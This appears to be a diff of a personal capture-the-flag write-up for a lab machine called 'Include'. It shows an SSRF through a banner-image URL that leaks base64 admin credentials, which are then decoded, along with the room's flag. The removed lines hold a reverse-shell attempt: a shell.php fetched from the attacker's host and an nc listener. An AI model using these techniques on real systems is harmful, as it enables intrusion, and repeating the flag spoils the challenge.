@@ -4,14 +4,14 @@
 
 **Difficulty :** Medium
 **Name :** Include
-**IP** : 10.10.102.230
+**IP** : 10.10.102.230 | 10.10.247.254
 **Objectives :** Get the flag value after logging in to the SysMon app and find the content of the hidden text file in /var/www/html
 **OS :** ?
 
 ##### **Conclusion**
 **Time :** 
 	**Start :** 17.03.2025 | 18:38
-	**Break at/to :** 17.03.2025 | 19:31
+	**Break at/to :** 17.03.2025 | 19:31  //  24.03.2025 | 19:10
 	**Finish :** 
 **Satisfaction :**  
 ### 1. **Reconnaissance
@@ -267,18 +267,35 @@ Response:
 }
 ```
 
+On the admin setting of the port 4000 we change the Banner Image to 
+
+`http://127.0.0.1:5000/getAllAdmins101099991`
+
+And we got this :
+
+`data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=`
+
+We can decode the base64 : 
+
+![[Pasted image 20250324191309.png]]
+
+`{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}`
+
+So let's try to connect to the SysMonApp
+
+![[Pasted image 20250324191439.png]]
+
+We have the first flag.
+`THM{!50_55Rf_1S_d_k3Y??!}`
+
+
+When we load the `dashboard.php` 
+
+![[Pasted image 20250324191949.png]]
 
 ## 5. **Installation
 
-On the admin setting of the port 4000 we change the Banner Image to 
 
-`http://10.10.196.9:1234/shell.php`
-
-Now we listening on the 4444 port
-
-`nc -lvnp 4444`
-
-Adn we go to the banner image.
 
 ## 6. **Command and Control
 
